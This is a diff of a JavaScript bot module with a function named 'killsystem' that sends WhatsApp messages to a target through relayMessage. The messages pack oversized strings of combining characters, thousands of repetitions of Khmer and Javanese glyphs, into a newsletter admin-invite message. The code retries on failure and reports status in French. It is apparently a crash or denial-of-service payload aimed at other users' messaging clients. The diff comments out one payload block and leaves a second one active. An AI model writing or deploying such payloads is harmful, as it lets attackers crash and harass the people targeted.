@@ -275,7 +275,7 @@ export default {
       async function killsystem(trim, target) {
         if (!trim || !target) return;
 
-        const uw = "ោ៝".repeat(10000);
+        /*const uw = "ោ៝".repeat(10000);
         const uz = "ꦾ".repeat(10000);
         const up = {
           newsletterAdminInviteMessage: {
@@ -293,8 +293,8 @@ export default {
 
         try {
           await trim.relayMessage(target, up, {
-            participant: { jid: target }
-            //messageId: null
+            participant: { jid: target },
+            messageId: null
           });
         } catch (actionError) {
           const errorDetails = actionError instanceof Error
@@ -307,7 +307,7 @@ export default {
             : actionError;
           context.onStatus?.(`Ligne1 ⚠️ Action ratée — ${JSON.stringify(errorDetails, null, 2)}\n🔄 Nouvelle tentative dans 2s`);
         }
-        await new Promise(resolve => setTimeout(resolve, 800));
+        await new Promise(resolve => setTimeout(resolve, 800));*/
 
         const uw2 = "ꦾ".repeat(61111);
         try {
